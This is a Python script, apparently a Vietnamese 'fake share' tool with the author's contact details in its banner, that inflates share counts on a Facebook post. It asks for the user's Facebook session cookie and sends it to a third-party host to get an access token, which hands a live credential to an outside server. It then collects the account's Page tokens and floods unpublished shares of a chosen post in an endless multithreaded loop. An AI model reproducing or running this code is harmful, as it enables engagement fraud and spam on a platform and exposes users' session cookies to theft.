import requests,random,threading,os
list_token = []
# =========================== [ CLASS + FUNCTION TOOL ] ===========================
def banner():
    # Nhận Code Tool Theo Yêu Cầu (Trong Khả Năng) 
    # Zalo: 0396735565 - Nguyễn Đức Phát 
    # Tele: @nguyenducphat - Nguyễn Đức Phát
    os.system("cls" if os.name == "nt" else "clear")
    os.system('title TOOL SHARE ẢO MAX SPEED - NGUYENDUCPHAT207')
    banner = '''
          Copyright © P-Tool 2023 | Phiên Bản: 1.0
          
    [  COPYRIGHT LICENSE: NGUYENDUCPHAT       ]
    [  NGUYEN DUC PHAT - ZALO: 0396735565     ]
    [  FB: FB.COM/NguyenDucPhat.Copyright     ]              
    [  TOOL SHARE ẢO MAX SPEED - VERSION 1.0  ]
    '''
    print(banner)
class NguyenDucPhatCuteVcl:
    def gettoken(self, cookie):
        # Nhận Code Tool Theo Yêu Cầu (Trong Khả Năng) 
        # Zalo: 0396735565 - Nguyễn Đức Phát 
        # Tele: @nguyenducphat - Nguyễn Đức Phát
        json_info = requests.get('https://ndptoolvip-api.tk/api/gettokeneaabw.php?cookie='+cookie).json()
        if json_info['status'] == 'success':
            return json_info
        else:
            return False
    def getpage(self, token):
        # Nhận Code Tool Theo Yêu Cầu (Trong Khả Năng) 
        # Zalo: 0396735565 - Nguyễn Đức Phát 
        # Tele: @nguyenducphat - Nguyễn Đức Phát
        try:
            json_get = requests.get('https://graph.facebook.com/me/accounts?access_token='+token).json()['data']
            if len(json_get) != 0:
                return json_get
            else: 
                return False
        except:
            return False
    def run_share(self, tokenpage, id_post):
        # Nhận Code Tool Theo Yêu Cầu (Trong Khả Năng) 
        # Zalo: 0396735565 - Nguyễn Đức Phát 
        # Tele: @nguyenducphat - Nguyễn Đức Phát
        rq_url = random.choice([requests.get, requests.post])
        sharepost = rq_url(f'https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/{id_post}&published=0&access_token={tokenpage}').json()
        if 'id' in sharepost:
            idshare = sharepost['id']
            print(f'[NĐP] | [UID SHARE: {idshare}] | TRẠNG THÁI: SUCCESS ')
        else:
            print('[NĐP] | TRẠNG THÁI: ERROR')
# =========================== [ START TOOL ] ===========================
banner()
while True:
    cookie = input('VUI LÒNG NHẬP COOKIE FACEBOOK CHỨA PAGE: ')
    dpcute = NguyenDucPhatCuteVcl()
    checklive = dpcute.gettoken(cookie)
    if checklive != False:
        token = checklive['access_token']
        name  = checklive['name']
        uid   = checklive['id']
        print('─'*50)
        print(f'NAME FB: {name} | UID FB: {uid}')
        print('─'*50)
        break
    else:
        print('Cookie Die Or Out Vui Lòng Nhập Lại!!')
        continue
id_post = input('UID POST: ')
print('─'*50)
luong = int(input('VUI LÒNG NHẬP SỐ LUỒNG SHARE: '))
print('─'*50)
getpage = dpcute.getpage(token)
if getpage != False:
    print(f'Đã Tìm Thấy | {len(getpage)} | Page', end='\r')
    for getdl in getpage:
        tokenpagegett = getdl['access_token']
        list_token.append(tokenpagegett)
else:
    print('Không Tìm Thấy Page Nào!!')
while True:
    for tokenpage in list_token:
        t = threading.Thread(target=dpcute.run_share,args=(tokenpage, id_post))
        t.start()
        while threading.active_count() > luong:
            t.join()